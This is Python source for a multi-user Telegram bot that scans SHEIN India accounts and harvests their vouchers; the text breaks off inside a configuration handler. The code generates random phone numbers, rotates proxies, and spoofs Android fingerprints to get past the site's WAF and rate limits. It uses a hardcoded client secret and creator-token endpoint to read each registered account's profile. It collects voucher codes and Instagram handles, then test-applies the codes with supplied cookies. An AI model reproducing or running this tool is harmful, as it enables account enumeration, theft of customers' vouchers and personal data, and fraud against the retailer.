"""
🎯 SHEIN Voucher Scanner & Checker Bot
⚡⚡ Made by RIVEN
Combines: bot_ultimate.py (scanner) + check.py (tester)
"""

import asyncio, os, sys, time, random, string, json, re, io, threading
from datetime import datetime, timezone, timedelta
from collections import deque

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from telegram import Update, BotCommand
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

from config import *

IST = timezone(timedelta(hours=5, minutes=30))

# ══════════════════════════════════════
#  GLOBAL STATE
# ══════════════════════════════════════
bandwidth_stats = {"requests": 0}
upload_state = {}

# Multi-user auth
DATA_DIR = "data"
AUTH_FILE = os.path.join(DATA_DIR, "authorized_users.json")
os.makedirs(DATA_DIR, exist_ok=True)

def load_auth_users():
    if os.path.exists(AUTH_FILE):
        try:
            with open(AUTH_FILE) as f: return set(json.load(f))
        except: pass
    return {ADMIN_ID}

def save_auth_users(users):
    with open(AUTH_FILE, 'w') as f: json.dump(list(users), f)

authorized_users = load_auth_users()

# Per-user state
class UserState:
    """Isolated state for each user — own folder, proxies, scan, config."""
    def __init__(self, uid):
        self.uid = uid
        self.folder = os.path.join(DATA_DIR, f"user_{uid}")
        os.makedirs(self.folder, exist_ok=True)
        # File paths
        self.proxy_file = os.path.join(self.folder, "proxy.txt")
        self.voucher_file = os.path.join(self.folder, "voucher.txt")
        self.logs_file = os.path.join(self.folder, "logs.json")
        self.cookies_file = os.path.join(self.folder, "cookies.json")
        self.applicable_file = os.path.join(self.folder, "applicable_vouchers.txt")
        self.not_applicable_file = os.path.join(self.folder, "not_applicable_vouchers.txt")
        # State
        self.proxies = []
        self.scan_running = asyncio.Event()
        self.scan_task = None
        self.scan_stats = None
        self.cfg = {"lanes": WORKERS_PER_PROXY, "batch": QUEUE_SIZE, "blast": TOKEN_REUSE_COUNT, "delay": VOUCHER_POLL_DELAY}

    def load_proxies(self):
        self.proxies = []
        if not os.path.exists(self.proxy_file): return []
        with open(self.proxy_file) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'): continue
                parts = line.split(':')
                if len(parts) == 4: self.proxies.append(Proxy(*parts))
        return self.proxies

    def save_proxies(self):
        with open(self.proxy_file, 'w') as f:
            for p in self.proxies: f.write(f"{p.base_user}:{p.password}:{p.host}:{p.port}\n")

user_states = {}  # {uid: UserState}

def get_user_state(uid):
    uid = int(uid)
    if uid not in user_states:
        user_states[uid] = UserState(uid)
    return user_states[uid]

# ══════════════════════════════════════
#  SCANNER HELPERS
# ══════════════════════════════════════
def random_ip():
    return f"{random.randint(100,200)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(1,250)}"

def random_ad_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=28))

def random_fingerprint():
    device = random.choice(DEVICES)
    ua = random.choice([
        'okhttp/4.9.3',
        f"Dalvik/2.1.0 (Linux; U; Android {device['android']}; {device['model']} Build/{device['build']})",
    ])
    return {"device": device, "ua": ua}

def generate_number():
    return random.choice(['6','7','8','9']) + ''.join(random.choices('0123456789', k=9))

# ══════════════════════════════════════
#  PROXY CLASS
# ══════════════════════════════════════
class Proxy:
    __slots__ = ['base_user','password','host','port','cooldown_until','consecutive_429','success_count','error_count']
    def __init__(self, user, password, host, port):
        self.base_user = user; self.password = password; self.host = host; self.port = port
        self.cooldown_until = 0.0; self.consecutive_429 = 0; self.success_count = 0; self.error_count = 0

    def get_url(self, sid=None):
        if sid is None: sid = random.randint(10_000_000, 99_999_999)
        if '_sid_' in self.base_user:
            si = self.base_user.index('_sid_')
            tp = self.base_user[self.base_user.index('_time_'):] if '_time_' in self.base_user else ''
            rotated = f"{self.base_user[:si]}_sid_{sid}{tp}"
        else:
            rotated = f"{self.base_user}_sid_{sid}_time_5"
        url = f"http://{rotated}:{self.password}@{self.host}:{self.port}"
        return {"http": url, "https": url}

    def report_429(self):
        self.consecutive_429 += 1
        self.cooldown_until = time.time() + min(0.5 * (2 ** (self.consecutive_429 - 1)), 5.0)
    def report_success(self):
        self.consecutive_429 = max(0, self.consecutive_429 - 1); self.cooldown_until = 0.0; self.success_count += 1
    def report_error(self): self.error_count += 1
    async def wait_cooldown(self):
        r = self.cooldown_until - time.time()
        if r > 0: await asyncio.sleep(r)
    def wait_cooldown_sync(self):
        r = self.cooldown_until - time.time()
        if r > 0: time.sleep(r)


# ══════════════════════════════════════
#  LOG MANAGER
# ══════════════════════════════════════
class LogManager:
    def __init__(self, fp):
        self.fp = fp; self.entries = []
        if os.path.exists(fp):
            try:
                with open(fp,'r',encoding='utf-8') as f: self.entries = json.load(f)
            except: self.entries = []
    def add(self, phone, status, enc_id=None, voucher_code=None, voucher_amount=None, insta=None):
        self.entries.append({"phone":phone,"status":status,"enc_id":enc_id,"voucher_code":voucher_code,
            "voucher_amount":voucher_amount,"instagram":insta,"timestamp_ist":datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S")})
        self._save()
    def _save(self):
        try:
            with open(self.fp,'w',encoding='utf-8') as f: json.dump(self.entries, f, indent=2, ensure_ascii=False)
        except: pass

# ══════════════════════════════════════
#  STATS
# ══════════════════════════════════════
class Stats:
    def __init__(self):
        self.checked=0; self.registered=0; self.vouchers=0; self.not_registered=0; self.errors=0; self.rate_limited=0
        self.start_time=time.time(); self._sw=deque(maxlen=200)
    def add(self, status):
        self.checked += 1; self._sw.append(time.time())
        if status=="VOUCHER": self.vouchers+=1; self.registered+=1
        elif status=="REG": self.registered+=1
        elif status=="NOT_REG": self.not_registered+=1
        elif status=="429": self.rate_limited+=1
        else: self.errors+=1
    def speed(self):
        if len(self._sw)<2: return 0.0
        w=list(self._sw); e=w[-1]-w[0]; return (len(w)-1)/e if e>0 else 0.0
    def elapsed_str(self):
        e=int(time.time()-self.start_time); m,s=divmod(e,60); h,m=divmod(m,60)
        return f"{h}h{m:02d}m" if h else f"{m}m{s:02d}s"
    def text(self):
        return (f"📊 Checked: `{self.checked:,}` | Reg: `{self.registered}` | "
                f"Vouchers: `{self.vouchers}` | 429: `{self.rate_limited}` | "
                f"Err: `{self.errors}` | Speed: `{self.speed():.1f}/s` | Time: `{self.elapsed_str()}`")

# ══════════════════════════════════════
#  WORKER (SCANNER)
# ══════════════════════════════════════
class Worker:
    """Uses standard requests library (not curl_cffi) to bypass Akamai WAF."""
    def __init__(self, wid, proxy, stats, log_mgr, bot_app, user_state):
        self.id=wid; self.proxy=proxy; self.stats=stats; self.log_mgr=log_mgr; self.bot_app=bot_app
        self.us=user_state  # per-user state
        self.token=None; self.token_uses=0; self.sid=random.randint(10_000_000,99_999_999)
        self.fp=random_fingerprint(); self.session=None

    async def start(self):
        self.session = requests.Session()
        adapter = HTTPAdapter(pool_connections=2, pool_maxsize=2, max_retries=Retry(total=0))
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

    async def stop(self):
        if self.session:
            try: self.session.close()
            except: pass

    def _get_headers(self):
        return {
            'Accept':'application/json',
            'User-Agent': self.fp['ua'],
            'Client_type':'Android/31',
            'Client_version': random.choice(['1.0.8','1.0.9','1.0.10']),
            'X-Tenant-Id':'SHEIN', 'X-Tenant':'B2C',
            'Content-Type':'application/x-www-form-urlencoded',
        }

    async def run(self, queue):
        await self.start()
        try:
            while self.us.scan_running.is_set():
                try: phone = queue.get_nowait()
                except asyncio.QueueEmpty: await asyncio.sleep(0.02); continue
                try:
                    result = await self._process(phone)
                    s = result.get("status","error")
                    if s=="VOUCHER_FOUND": self.stats.add("VOUCHER"); self._save_voucher(result)
                    elif s in ("registered","no_voucher"): self.stats.add("REG")
                    elif s=="not_registered": self.stats.add("NOT_REG")
                    elif s=="rate_limited": self.stats.add("429")
                    else: self.stats.add("ERROR")
                except: self.stats.add("ERROR")
                finally: queue.task_done()
        finally: await self.stop()

    def _process_sync(self, phone):
        """Synchronous processing — runs in thread via asyncio.to_thread."""
        result = {"phone": phone, "status": "unknown"}
        for attempt in range(MAX_RETRIES):
            self.proxy.wait_cooldown_sync()
            token = self._get_token_sync()
            if not token: self._rotate(); time.sleep(random.uniform(0.2,0.5)); continue
            try:
                proxies = self.proxy.get_url(self.sid)
                headers = self._get_headers()
                headers['Authorization'] = f'Bearer {token}'
                headers['Requestid'] = 'account_check'
                r = self.session.post(ACCOUNT_CHECK_URL, headers=headers, data=f"mobileNumber={phone}",
                    proxies=proxies, timeout=15)
                bandwidth_stats["requests"] += 1
                if r.status_code==429: self.proxy.report_429(); self._rotate(); result["status"]="rate_limited"; continue
                if r.status_code==403: self._rotate(); time.sleep(random.uniform(0.3,0.8)); continue
                if r.status_code!=200: self.token=None; continue
                self.proxy.report_success(); self.token_uses+=1
                data=r.json(); enc_id=None
                for c in [data, data.get('data'), data.get('result')]:
                    if isinstance(c,dict) and 'encryptedId' in c: enc_id=c['encryptedId']; break
                if not enc_id: result["status"]="not_registered"; return result
                result["status"]="registered"; result["enc_id"]=enc_id
                self.log_mgr.add(phone,"registered",enc_id=enc_id)
                for poll in range(self.us.cfg["blast"]):
                    pr = self._fetch_voucher_sync(phone, enc_id)
                    if pr.get("status")=="VOUCHER_FOUND": return pr
                    if poll < VOUCHER_POLL_RETRIES-1: time.sleep(self.us.cfg["delay"])
                result["status"]="no_voucher"; return result
            except Exception as e:
                err=str(e).lower()
                if any(k in err for k in ['proxy','connect','abort','timeout','reset','refused']):
                    self.proxy.report_error(); self._rotate(); time.sleep(random.uniform(0.3,0.8)); continue
                result["status"]="error"; return result
        return result

    async def _process(self, phone):
        return await asyncio.to_thread(self._process_sync, phone)

    def _get_token_sync(self):
        if self.token and self.token_uses < self.us.cfg["blast"]: return self.token
        try:
            proxies=self.proxy.get_url(self.sid)
            headers=self._get_headers()
            r=self.session.post(CLIENT_TOKEN_URL, headers=headers,
                data="grantType=client_credentials&clientName=trusted_client&clientSecret=secret",
                proxies=proxies, timeout=15)
            bandwidth_stats["requests"]+=1
            if r.status_code==200:
                resp=r.json(); token=resp.get('access_token') or resp.get('accessToken')
                if not token and 'data' in resp: token=resp['data'].get('access_token') or resp['data'].get('accessToken')
                if token: self.token=token; self.token_uses=0; self.proxy.report_success(); return token
            elif r.status_code==429: self.proxy.report_429()
        except: self.proxy.report_error()
        self.token=None; return None

    def _fetch_voucher_sync(self, phone, enc_id):
        result={"phone":phone,"enc_id":enc_id,"status":"no_voucher"}
        try:
            proxies=self.proxy.get_url()
            ch={'Accept':'application/json','User-Agent':'okhttp/4.9.3','Client_type':'Android/29',
                'X-Tenant-Id':'SHEIN','Ad_id':random_ad_id(),
                'Content-Type':'application/json; charset=UTF-8'}
            r=self.session.post(CREATOR_TOKEN_URL, json={"client_type":"Android/29","client_version":"1.0.8",
                "gender":"male","phone_number":phone,"secret_key":SECRET_KEY,"user_id":enc_id,"user_name":"CLI_User"},
                headers=ch, proxies=proxies, timeout=15)
            bandwidth_stats["requests"]+=1
            if r.status_code!=200: return result
            tok=r.json().get("access_token")
            if not tok: return result
            ph={'Authorization':f'Bearer {tok}','Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
            r2=self.session.get(PROFILE_URL, headers=ph, proxies=self.proxy.get_url(), timeout=15)
            bandwidth_stats["requests"]+=1
            if r2.status_code!=200: return result
            ud=r2.json().get("user_data",{})
            ig=ud.get("instagram_data"); insta_id=ig.get("username","") if ig and isinstance(ig,dict) else ""
            vlist=ud.get("vouchers",[]); vd=ud.get("voucher_data")
            if vd and isinstance(vd,dict) and vd.get("voucher_code"): vlist.append(vd)
            if not vlist: return result
            for v in vlist:
                code=v.get("voucher_code","")
                exp_raw=v.get("expiry_date","").split("T")[0]
                if code and exp_raw == "2026-06-30":
                    # Extract min purchase — field is min_purchase_amount (integer like 1000)
                    min_p = v.get("min_purchase_amount", "N/A")
                    if min_p is None: min_p = "N/A"
                    result.update({"status":"VOUCHER_FOUND","voucher_code":code,"voucher_amount":v.get("voucher_amount",""),
                        "min_purchase":min_p,
                        "assigned":v.get("assigned_at","").split("T")[0],"expiry":exp_raw,
                        "insta":insta_id,"all_vouchers":vlist})
                    return result
        except: pass
        return result

    def _save_voucher(self, result):
        code=result.get("voucher_code","N/A"); amount=result.get("voucher_amount","N/A")
        min_p=result.get("min_purchase","N/A")
        insta=result.get("insta","N/A"); assigned=result.get("assigned",""); expiry=result.get("expiry","")
        line=f"{code} | Rs.{amount} | Min Rs.{min_p} | @{insta} | {assigned} | {expiry}"
        with open(self.us.voucher_file,"a",encoding="utf-8") as f: f.write(line+"\n")
        for v in result.get("all_vouchers",[])[1:]:
            c2=v.get("voucher_code",""); e2=v.get("expiry_date","").split("T")[0]
            a2=v.get("assigned_at","").split("T")[0]
            mp2=v.get("min_purchase_amount","N/A"); am2=v.get("voucher_amount","N/A")
            if c2 and e2 == "2026-06-30":
                with open(self.us.voucher_file,"a",encoding="utf-8") as f: f.write(f"{c2} | Rs.{am2} | Min Rs.{mp2} | {a2} | {e2}\n")
        self.log_mgr.add(result["phone"],"VOUCHER_FOUND",enc_id=result.get("enc_id"),
            voucher_code=code, voucher_amount=str(amount), insta=insta)
        # Notify via Telegram
        try:
            asyncio.get_event_loop().create_task(
                self.bot_app.bot.send_message(self.us.uid,
                    f"\U0001f3ab *VOUCHER FOUND!*\n`{code}` | Rs.{amount} | Min Rs.{min_p} | exp:{expiry}",
                    parse_mode="Markdown"))
        except: pass

    def _rotate(self):
        self.sid=random.randint(10_000_000,99_999_999); self.token=None; self.token_uses=0

# ══════════════════════════════════════
#  CHECKER (from check.py)
# ══════════════════════════════════════
def load_cookies(cookies_file):
    if not os.path.exists(cookies_file): return None
    try:
        with open(cookies_file,"r",encoding="utf-8") as f: raw=f.read().strip()
        data=json.loads(raw)
        if isinstance(data,list):
            pairs=[]
            for c in data:
                n=c.get("name",""); v=c.get("value",""); d=c.get("domain","")
                if "sheinindia" in d and n and v: pairs.append(f"{n}={v}")
            return "; ".join(pairs)
        elif isinstance(data,dict): return "; ".join(f"{k}={v}" for k,v in data.items())
        return raw
    except: return None

def checker_headers(cookie_string):
    return {"accept":"application/json","accept-encoding":"gzip, deflate, br, zstd","accept-language":"en-US,en;q=0.9",
        "cache-control":"no-cache","content-type":"application/json","origin":"https://www.sheinindia.in",
        "pragma":"no-cache","referer":"https://www.sheinindia.in/cart",
        "sec-ch-ua":'"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        "sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
        "sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-origin",
        "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
        "x-tenant-id":"SHEIN","cookie":cookie_string}

def apply_voucher(code, headers):
    """Apply voucher → returns (status_code, response_json)"""
    try:
        r=requests.post(APPLY_URL, json={"voucherId":code,"device":{"client_type":"web"}}, headers=headers, timeout=20)
        bandwidth_stats["requests"]+=1
        return r.status_code, r.json()
    except: return None, None

def reset_voucher(code, headers):
    try: requests.post(RESET_URL, json={"voucherId":code,"device":{"client_type":"web"}}, headers=headers, timeout=15)
    except: pass

def extract_voucher_info(data):
    """Extract (applicable, price, min_purchase) from API response."""
    if not data: return False, "", ""
    if "errorMessage" in data:
        errors=data.get("errorMessage",{}).get("errors",[])
        for e in errors:
            if e.get("type")=="VoucherOperationError" and "not applicable" in e.get("message","").lower():
                return False, "", ""
        return False, "", ""
    price=""; min_purchase=""
    try:
        for src in [data.get("data",{}), data]:
            if not isinstance(src,dict): continue
            # Price
            va=src.get("voucherAmount") or src.get("discountAmount") or src.get("discount")
            if va is not None:
                if isinstance(va,dict): price=va.get("displayformattedValue","") or f"Rs.{va.get('value','')}"
                else: price=f"Rs.{va}"
            # Min purchase
            mp=src.get("minAmount") or src.get("minimumPurchase") or src.get("minOrderAmount")
            if mp is not None:
                if isinstance(mp,dict): min_purchase=mp.get("displayformattedValue","") or f"Rs.{mp.get('value','')}"
                else: min_purchase=f"Rs.{mp}"
            if price: break
    except: pass
    return True, price, min_purchase

def parse_voucher_file(filepath):
    """Parse voucher.txt → list of unique codes"""
    codes=[]
    seen=set()
    if not os.path.exists(filepath): return codes
    with open(filepath,"r",encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line or line.startswith("==="): continue
            code=[p.strip() for p in line.split("|")][0]
            if code and code not in seen: seen.add(code); codes.append(code)
    return codes

def parse_applicable_file(filepath):
    """Parse applicable_vouchers.txt → list of dicts"""
    results=[]
    if not os.path.exists(filepath): return results
    with open(filepath,"r",encoding="utf-8") as f:
        for line in f:
            line=line.strip()
            if not line: continue
            parts=[p.strip() for p in line.split("|")]
            code=parts[0]; price=parts[1] if len(parts)>1 else ""; expiry=parts[2] if len(parts)>2 else ""
            nums=re.sub(r'[^\d]','', price.split("off")[0] if "off" in price else price)
            val=int(nums) if nums else 0
            results.append({"code":code,"price":price,"expiry":expiry,"value":val,"raw":line})
    return results

def save_applicable_file(vouchers, filepath):
    """Rewrite applicable_vouchers.txt from list of dicts"""
    with open(filepath,"w",encoding="utf-8") as f:
        for v in vouchers:
            f.write(v["raw"]+"\n")

# ══════════════════════════════════════
#  AUTH CHECKS
# ══════════════════════════════════════
def is_admin(update):
    return update.effective_user.id == ADMIN_ID

def is_authorized(update):
    return update.effective_user.id in authorized_users

# ══════════════════════════════════════
#  TELEGRAM HANDLERS
# ══════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): await update.message.reply_text("⛔ ACCESS DENIED\nContact owner for access."); return
    msg = (
        "🎯 SHEIN Voucher Scanner\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📋 Commands:\n\n"
        "🔍 /find <number/code> - Lookup\n"
        "▶️ /scan - Start scanning\n"
        "⏹️ /stop - Stop scanning\n"
        "📊 /status - Quick stats\n"
        "📈 /stats - Detailed stats\n\n"
        "🌐 Proxy:\n"
        "📝 /addproxy - Paste to add\n"
        "🔄 /replaceproxy - Replace all\n"
        "🗑️ /clearproxy - Clear all\n"
        "♻️ /proxyreload - Reload file\n"
        "🔗 /proxystatus - Health info\n\n"
        "⚙️ Config:\n"
        "📋 /config - Show config\n"
        "🔧 /setlanes <n>\n"
        "🔧 /setbatch <n>\n"
        "🔧 /setblast <n>\n"
        "🔧 /setdelay <sec>\n\n"
        "🎟️ Vouchers:\n"
        "📋 /vouchers - List found\n"
        "🔍 /check - Test all vouchers\n"
        "✅ /applicable - Working ones\n"
        "📤 /export - Send file\n"
        "🗑️ /clear - Clear list\n"
        "📦 /bandwidth\n\n"
    )
    if is_admin(update):
        msg += (
            "👑 Owner Commands:\n"
            "➕ /adduser <user_id>\n"
            "➖ /removeuser <user_id>\n"
            "📋 /listusers\n\n"
        )
    msg += "━━━━━━━━━━━━━━━━━━━━━\n⚡⚡ Made by RIVEN"
    await update.message.reply_text(msg)

# ── OWNER COMMANDS ──
async def cmd_adduser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update): await update.message.reply_text("⛔ Owner only command."); return
    if not ctx.args or not ctx.args[0].isdigit():
        await update.message.reply_text("Usage: /adduser <user_id>"); return
    uid = int(ctx.args[0])
    if uid in authorized_users:
        await update.message.reply_text(f"⚠️ User {uid} already authorized."); return
    authorized_users.add(uid)
    save_auth_users(authorized_users)
    await update.message.reply_text(f"✅ User {uid} added!\nTotal users: {len(authorized_users)}")
    # Notify the new user
    try:
        await ctx.bot.send_message(uid, "🎉 You've been granted access to SHEIN Voucher Scanner!\nSend /start to begin.")
    except: pass

async def cmd_removeuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update): await update.message.reply_text("⛔ Owner only command."); return
    if not ctx.args or not ctx.args[0].isdigit():
        await update.message.reply_text("Usage: /removeuser <user_id>"); return
    uid = int(ctx.args[0])
    if uid == ADMIN_ID:
        await update.message.reply_text("❌ Cannot remove owner!"); return
    if uid not in authorized_users:
        await update.message.reply_text(f"❌ User {uid} not found."); return
    authorized_users.discard(uid)
    save_auth_users(authorized_users)
    await update.message.reply_text(f"✅ User {uid} removed!\nTotal users: {len(authorized_users)}")

async def cmd_listusers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update): await update.message.reply_text("⛔ Owner only command."); return
    txt = f"👥 Authorized Users ({len(authorized_users)}):\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid in sorted(authorized_users):
        tag = "👑 Owner" if uid == ADMIN_ID else "👤 User"
        txt += f"{tag}: `{uid}`\n"
    txt += f"\n━━━━━━━━━━━━━━━━━━━━━\n⚡⚡ Made by RIVEN"
    await update.message.reply_text(txt, parse_mode="Markdown")

# ── SCAN ──
async def cmd_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    if us.scan_running.is_set():
        await update.message.reply_text("⚠️ Scan already running! Use /stop first."); return
    if not us.proxies:
        us.load_proxies()
        if not us.proxies: await update.message.reply_text("❌ No proxies! Add with /addproxy"); return
    us.scan_stats = Stats()
    us.scan_running.set()
    us.scan_task = asyncio.create_task(_scan_loop(ctx, us))
    lanes = us.cfg["lanes"]; total_w = len(us.proxies) * lanes
    await update.message.reply_text(
        f"▶️ *Scan Started!*\n\n"
        f"📡 Proxies: `{len(us.proxies)}`\n"
        f"👷 Workers: `{total_w}` ({lanes}/proxy)\n"
        f"🔄 Token reuse: `{us.cfg['blast']}x`\n"
        f"⏱️ Poll delay: `{us.cfg['delay']}s`\n\n"
        f"_Use /stop to halt, /status for stats_", parse_mode="Markdown")

async def _scan_loop(ctx, us):
    log_mgr = LogManager(us.logs_file)
    queue = asyncio.Queue(maxsize=us.cfg["batch"])
    workers = []
    for proxy in us.proxies:
        for i in range(us.cfg["lanes"]):
            w = Worker(len(workers), proxy, us.scan_stats, log_mgr, ctx.application, us)
            workers.append(w)
    random.shuffle(workers)
    tasks = []
    for idx, w in enumerate(workers):
        async def sw(worker=w, delay=idx*0.01):
            await asyncio.sleep(delay); await worker.run(queue)
        tasks.append(asyncio.create_task(sw()))
    async def feeder():
        while us.scan_running.is_set():
            if queue.qsize() < us.cfg["batch"]//2:
                for _ in range(min(100, us.cfg["batch"]-queue.qsize())):
                    if not us.scan_running.is_set(): return
                    await queue.put(generate_number())
            else: await asyncio.sleep(0.05)
    tasks.append(asyncio.create_task(feeder()))
    async def reporter():
        while us.scan_running.is_set():
            await asyncio.sleep(30)
            if us.scan_running.is_set() and us.scan_stats:
                try: await ctx.bot.send_message(us.uid, f"📊 {us.scan_stats.text()}", parse_mode="Markdown")
                except: pass
    tasks.append(asyncio.create_task(reporter()))
    try: await asyncio.gather(*tasks)
    except asyncio.CancelledError: pass

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    if not us.scan_running.is_set():
        await update.message.reply_text("⚠️ No scan running."); return
    us.scan_running.clear()
    if us.scan_task: us.scan_task.cancel(); us.scan_task = None
    txt = "⏹️ *Scan Stopped!*"
    if us.scan_stats: txt += f"\n\n{us.scan_stats.text()}"
    await update.message.reply_text(txt, parse_mode="Markdown")

# ── FIND ──
async def cmd_find(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    args = ctx.args
    if not args: await update.message.reply_text("Usage: `/find <number or voucher_code>`", parse_mode="Markdown"); return
    query = args[0].strip()
    # Smart detect: 10 digits = phone, else = voucher code
    if re.match(r'^\d{10}$', query):
        await _find_number(update, ctx, query)
    else:
        await _find_voucher(update, ctx, query)

async def _find_number(update, ctx, phone):
    uid = update.effective_user.id; us = get_user_state(uid)
    if not us.proxies: us.load_proxies()
    if not us.proxies: await update.message.reply_text("❌ No proxies!"); return
    msg = await update.message.reply_text(f"🔍 Looking up `{phone}`...", parse_mode="Markdown")
    proxy = random.choice(us.proxies)
    st = Stats(); lm = LogManager(us.logs_file)
    w = Worker(0, proxy, st, lm, ctx.application, us)
    await w.start()
    try:
        result = await w._process(phone)
        s = result.get("status","unknown")
        if s == "VOUCHER_FOUND":
            code=result.get("voucher_code","?"); amt=result.get("voucher_amount","?")
            min_p=result.get("min_purchase","?"); insta=result.get("insta","?"); expiry=result.get("expiry","?")
            txt = f"🎟️ *VOUCHER FOUND!*\n\n📱 `{phone}`\n🏷️ Code: `{code}`\n💰 Amount: Rs.{amt}\n🛒 Min Purchase: Rs.{min_p}\n📸 Insta: @{insta}\n📅 Expiry: {expiry}"
        elif s in ("registered","no_voucher"):
            txt = f"✅ *Registered* but no voucher\n📱 `{phone}`"
        elif s == "not_registered":
            txt = f"❌ *Not registered* on SHEIN\n📱 `{phone}`"
        else:
            txt = f"⚠️ *Error/Rate limited*\n📱 `{phone}`"
        await msg.edit_text(txt, parse_mode="Markdown")
    finally: await w.stop()

async def _find_voucher(update, ctx, code):
    uid = update.effective_user.id; us = get_user_state(uid)
    cookie_str = load_cookies(us.cookies_file)
    if not cookie_str: await update.message.reply_text("❌ No cookies! Send cookies.json file"); return
    msg = await update.message.reply_text(f"🔍 Checking `{code}`...", parse_mode="Markdown")
    headers = checker_headers(cookie_str)
    status, data = apply_voucher(code, headers)
    if status is None:
        await msg.edit_text(f"⚠️ Request failed for `{code}`", parse_mode="Markdown"); return
    ok, price, min_purch = extract_voucher_info(data)
    reset_voucher(code, headers)
    if ok:
        detail = price
        if min_purch: detail = f"{price} off on min {min_purch}"
        await msg.edit_text(f"✅ *APPLICABLE!*\n\n🏷️ `{code}`\n💰 {detail}", parse_mode="Markdown")
    else:
        await msg.edit_text(f"❌ *Not applicable*\n🏷️ `{code}`", parse_mode="Markdown")

# ── STATUS / STATS ──
async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    if us.scan_stats and us.scan_running.is_set():
        await update.message.reply_text(f"▶️ Scanning...\n{us.scan_stats.text()}", parse_mode="Markdown")
    elif us.scan_stats:
        await update.message.reply_text(f"⏹️ Stopped.\n{us.scan_stats.text()}", parse_mode="Markdown")
    else:
        await update.message.reply_text("📊 No scan data yet. Use /scan to start.")

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    vcodes = parse_voucher_file(us.voucher_file)
    app_v = parse_applicable_file(us.applicable_file)
    txt = "📈 *Detailed Stats*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    if us.scan_stats:
        txt += f"*Scanner:*\n{us.scan_stats.text()}\n\n"
    txt += (f"*Files:*\n📄 voucher.txt: `{len(vcodes)}` codes\n"
            f"✅ applicable: `{len(app_v)}` vouchers\n"
            f"📡 Proxies: `{len(us.proxies)}`\n"
            f"📂 Folder: `{us.folder}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n⚡⚡ Made by RIVEN")
    await update.message.reply_text(txt, parse_mode="Markdown")

# ── PROXY COMMANDS ──
async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id
    upload_state[uid] = "addproxy"
    await update.message.reply_text("📝 Paste proxies (one per line):\n`user:pass:host:port`", parse_mode="Markdown")

async def cmd_replaceproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id
    upload_state[uid] = "replaceproxy"
    await update.message.reply_text("🔄 Paste NEW proxies to replace all:\n`user:pass:host:port`", parse_mode="Markdown")

async def cmd_clearproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    us.proxies.clear()
    if os.path.exists(us.proxy_file): os.remove(us.proxy_file)
    await update.message.reply_text("🗑️ All proxies cleared!")

async def cmd_proxyreload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    us.load_proxies()
    await update.message.reply_text(f"♻️ Reloaded `{len(us.proxies)}` proxies from file.", parse_mode="Markdown")

async def cmd_proxystatus(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    if not us.proxies: await update.message.reply_text("❌ No proxies loaded."); return
    txt = "🔗 *Proxy Health*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, p in enumerate(us.proxies[:20], 1):
        icon = "🟢" if p.consecutive_429 == 0 else "🟡" if p.consecutive_429 < 3 else "🔴"
        txt += f"{icon} `P{i}` ✓{p.success_count} ✗{p.error_count} 429:{p.consecutive_429}\n"
    healthy = sum(1 for p in us.proxies if p.consecutive_429 == 0)
    txt += f"\n✅ Healthy: `{healthy}/{len(us.proxies)}`"
    await update.message.reply_text(txt, parse_mode="Markdown")

# ── CONFIG COMMANDS ──
async def cmd_config(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    uid = update.effective_user.id; us = get_user_state(uid)
    txt = (f"⚙️ *Config*\n━━━━━━━━━━━━━━━━━━━━━\n\n"
           f"👷 Lanes: `{us.cfg['lanes']}`\n"
           f"📦 Batch: `{us.cfg['batch']}`\n"
           f"🔄 Blast: `{us.cfg['blast']}`\n"
           f"⏱️ Delay: `{us.cfg['delay']}`\n"
           f"📡 Proxies: `{len(us.proxies)}`\n"
           f"📂 Folder: `{us.folder}`")
    await update.message.reply_text(txt, parse_mode="Markdown")

async def cmd_setlanes(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    us = get_user_state(update.effective_user.id)
